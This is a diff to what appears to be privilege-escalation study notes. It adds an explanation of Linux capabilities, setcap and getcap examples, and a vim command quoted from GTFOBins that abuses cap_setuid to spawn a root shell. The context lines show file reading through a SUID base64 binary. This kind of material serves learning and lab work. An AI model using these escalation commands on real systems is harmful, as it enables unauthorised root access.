@@ -144,3 +144,44 @@ sudo install -m =xs $(which base64) .
 LFILE=file_to_read
 ./base64 "$LFILE" | base64 --decode
 ```
+
+### Capabilities in linux
+
+In Linux, capabilities refer to a feature that allows fine-grained control over privileges traditionally associated with the superuser (root) account. They provide a way to delegate specific privileged operations to non-root users or processes, reducing the need for processes to run with full root privileges.
+
+Capabilities were introduced to address certain limitations and security concerns associated with the traditional Unix model of privilege escalation using the setuid mechanism (where an executable runs with the privileges of the file owner).
+
+For example, the following command set the capability `cap_net_raw` permit on the `/bin/ping`.
+```
+sudo setcap cap_net_raw=p /bin/ping
+```
+
+Available capabilities can be check by either one of these commands below
+```
+man capabilities | grep -E "^\s*CAP_"
+man capabilities | grep -E "^\s{7}CAP_"
+man capabilities | grep -Ec "^\s{7}CAP_"
+```
+
+#### Listing Capabilities Set in the System
+
+```
+getcap -r / 2>/dev/null
+```
+
+#### Abusing the Capability set on `vim`
+```
+/path/to/vim = cap_setuid+ep
+```
+The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/vim/)
+```
+cp $(which vim) .
+sudo setcap cap_setuid+ep vim
+
+./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+
+
+
+
+
